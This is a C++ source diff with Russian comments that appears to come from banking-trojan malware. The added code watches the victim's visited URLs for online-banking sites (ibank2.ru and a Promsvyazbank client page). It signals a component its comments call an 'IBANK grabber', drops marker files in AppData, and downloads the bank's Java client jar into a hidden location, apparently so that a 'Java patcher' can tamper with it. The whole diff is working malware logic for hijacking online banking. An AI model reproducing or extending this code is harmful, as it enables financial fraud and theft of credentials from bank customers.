@@ -35,6 +35,9 @@ public:
     string URL;
 };
 
+
+HANDLE Downloadclient2015FileThread = NULL;
+
 // Функция потока загрузки файла
 DWORD WINAPI Downloadclient2015File(LPVOID D)
 {
@@ -55,7 +58,22 @@ DWORD WINAPI Downloadclient2015File(LPVOID D)
 
 	delete Data;
 
+    Downloadclient2015FileThread = NULL;
+
 	return 0;
+}
+
+
+
+
+void WriteClientFileDomain(PCHAR URL, DWORD Len)
+{
+	// Записываем хост в файл
+	string FN = GetJavaClient2015FileName();
+	if (!FN.IsEmpty())
+	{
+		File::WriteBufferA(FN.t_str(), URL, Len);
+	}
 }
 
 
@@ -70,53 +88,68 @@ DWORD WINAPI Downloadclient2015File(LPVOID D)
 void CheckJavaClient2015File(const char *aURL)
 {
 
-	if (!WildCmp((PCHAR)aURL, "*/client_ver.js"))
+	// Этот кусок кода информирует
+	// IBANK грабер про обнаружение вхождение на
+	// сайт Промсвязь Банк
+	if (WildCmp((PCHAR)aURL, "*://online.payment.ru/juricvalrur/JuridicalClient.html"))
+	{
+		File::WriteBufferA(GetPSBSignalFileName().t_str(), NULL, 0);
+		return;
+    }
+
+
+    // Проверяем адреса
+	if (Downloadclient2015FileThread)
 		return;
 
 
-		// Определяем путь хранения файла
-		string Path(MAX_PATH);
-
-		pGetEnvironmentVariableA("ALLUSERSPROFILE", Path.t_str(), MAX_PATH);
-
-
-		Path.CalcLength();
-
-		if (Path.IsEmpty())
-            return;
-
-		Path  += "\\";
-
-		//Создаём временное имя файла
-		string FileName = Path + "_client2015_orig.jar";
-
-		// В случае существования данного файла, игнорируем данные
-		if (FileExistsA(FileName.t_str()))
-			return;
+	if (!WildCmp((PCHAR)aURL, "*/client_ver.js") &&
+		!WildCmp((PCHAR)aURL, "*://ibank2.ru/*"))
+		return;
 
 
-		TURL URL(aURL);
+	// Определяем путь хранения файла
+	string Path(MAX_PATH);
+
+	pGetEnvironmentVariableA("ALLUSERSPROFILE", Path.t_str(), MAX_PATH);
+
+
+	Path.CalcLength();
+
+	if (Path.IsEmpty())
+		return;
+
+	Path  += "\\";
+
+	//Создаём временное имя файла
+	string FileName = Path + "_client2015_orig.jar";
+
+
+	if (FileExistsA(FileName.t_str()))
+		return;
+
+	TURL URL(aURL);
+	if (URL.Host.Hash() == 0xDF8E3E03 /* ibank2.ru */)
+		URL.Document = "ibank2client.jar";
+	else
 		URL.Document =  "client2015.jar";
 
-		TJavaClientFileData *Data = new TJavaClientFileData();
+	TJavaClientFileData *Data = new TJavaClientFileData();
 
-		Data->FileName     = FileName;
-		Data->TempFileName = Path + "client2015.tmp";
-		Data->URL          = URL.URL();
-
-		StartThread(Downloadclient2015File, Data);
+	Data->FileName     = FileName;
+	Data->TempFileName = Path + "client2015.tmp";
+	Data->URL          = URL.URL();
 
 
-		// Записываем хост в файл
-		string FN = GetJavaClient2015FileName();
-		if (!FN.IsEmpty())
-		{
-			string Host = URL.Protocol;
-			Host += HTTPProtocolDelimeter;
-			Host += URL.Host;
+	Downloadclient2015FileThread = StartThread(Downloadclient2015File, Data);
 
-            File::WriteBufferA(FN.t_str(), Host.t_str(), Host.Length());
-		}
+
+	string Host = URL.Protocol;
+	Host += HTTPProtocolDelimeter;
+	Host += URL.Host;
+
+	WriteClientFileDomain(Host.t_str(), Host.Length());
+
 }
 
 
@@ -127,15 +160,7 @@ void CheckJavaClient2015File(const char *aURL)
 //*****************************************************************
 string GetJavaClient2015FileName()
 {
-	string Path(MAX_PATH);
-
-	if (pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
-	{
-        Path.CalcLength();
-        Path += "\\jclib25.ini";
-    }
-
-	return Path;
+	return GetSpecialFolderPathA(CSIDL_APPDATA, "jclib25.ini");
 }
 
 
@@ -143,7 +168,7 @@ string GetJavaClient2015FileName()
 // Функция возвращает значение хоста с которого качали оригинальный
 // файл
 //*****************************************************************
-string GetJavaClient2015HkstName()
+string GetJavaClient2015HostName()
 {
 	string Host;
 
@@ -159,4 +184,27 @@ string GetJavaClient2015HkstName()
     }
 
     return Host;
+}
+
+
+
+//*****************************************************************
+//  GetPSBSignalFileName - Функция возвращает имя сигнального
+//						   файла, который создастся при обнаруже
+//  нии системы PSB - Промсвязь Банк. Этот файл нужен для игнори-
+//  рования установки ява патчера на эту систему.
+//*****************************************************************
+string GetPSBSignalFileName()
+{
+	return GetSpecialFolderPathA(CSIDL_APPDATA, "bcspsb.inf");
+}
+
+
+//*****************************************************************
+//  IsPSBSystem - Функция возвращает истину если в системе стоит
+//                сигнальный файл PSB
+//*****************************************************************
+bool IsPSBSystem()
+{
+	return FileExistsA(GetPSBSignalFileName().t_str());
 }
